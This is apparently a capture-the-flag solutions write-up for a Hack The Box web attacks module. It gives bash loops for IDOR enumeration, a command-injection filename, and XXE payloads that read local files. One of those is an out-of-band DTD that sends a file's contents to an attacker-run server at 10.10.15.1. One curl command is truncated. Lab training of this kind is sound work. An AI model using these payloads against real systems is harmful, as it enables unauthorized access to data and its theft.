# [HTB] Web Attacks

## Bypassing Basic Authentication

>**Q. Try to use what you learned in this section to access the 'reset.php' page and delete all files. Once all files are deleted, you should get the flag.**

## Bypassing Security Filters
 
>**Q. To get the flag, try to bypass the command injection filter through HTTP Verb Tampering, while using the following filename: file; cp /flag.txt ./**

## Mass IDOR Enumeration

>**Q. Repeat what you learned in this section to get a list of documents of the first 20 user uid's in /documents.php, one of which should have a '.txt' file with the flag.**
```sh
sudo nano documents.sh
sudo chmod +x documents.sh
```
```sh
#!/bin/bash


for i in {0..50}; do
        for link in $(curl -X POST http://83.136.250.34:49965/documents.php -d >
                wget -q http://83.136.250.34:49965/$link
        done
done
```
```sh
./documents.sh

```

## Bypassing Encoded References

>**Q. Try to download the contracts of the first 20 employee, one of which should contain the flag, which you can read with 'cat'. You can either calculate the 'contract' parameter value, or calculate the '.pdf' file name directly.**
```sh
sudo nano encode.sh
sudo chmod +x encode.sh
```
```sh
#!/bin/bash


for i in {1..20}; do
    for hash in $( (echo -n $i | base64 -w 0) |jq -sRr @uri); do
        curl -s "http://83.136.250.34:36131/download.php?contract=$hash"
    done
done
```


## IDOR in Insecure APIs

>**Q. Try to read the details of the user with 'uid=5'. What is their 'uuid' value?**

## Chaining IDOR Vulnerabilities

>**Q. Try to change the admin's email to 'flag@idor.htb', and you should get the flag on the 'edit profile' page.**

## Local File Disclosure

>**Q. Try to read the content of the 'connection.php' file, and submit the value of the 'api_key' as the answer.**
```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=connection.php">
]>
```
## Advanced File Disclosure

>**Q. Use either method from this section to read the flag at '/flag.php'. (You may use the CDATA method at '/index.php', or the error-based method at '/error').**

```bash
sudo nano xxe.dtd
```

```dtd
<!ENTITY % file SYSTEM "file:///flag.php">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
```

```bash
python3 -m http.server 8000
```

```xml
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://10.10.15.1:8000/xxe.dtd">
  %remote;
  %error;
]>
```

## Blind Data Exfiltration

>**Q. Using Blind Data Exfiltration on the '/blind' page to read the content of '/327a6c4304ad5938eaf0efb6cc3e53dc.php' and get the flag.**
```bash
sudo nano xxe2.dtd 
```

```dtd
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/327a6c4304ad5938eaf0efb6cc3e53dc.php">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://10.10.15.1:8000/?content=%file;'>">
```

```bash
php -S 0.0.0.0:8000
```

## Web Attacks - Skills Assessment

>**Q. Try to escalate your privileges and exploit different vulnerabilities to read the flag at '/flag.php'.**
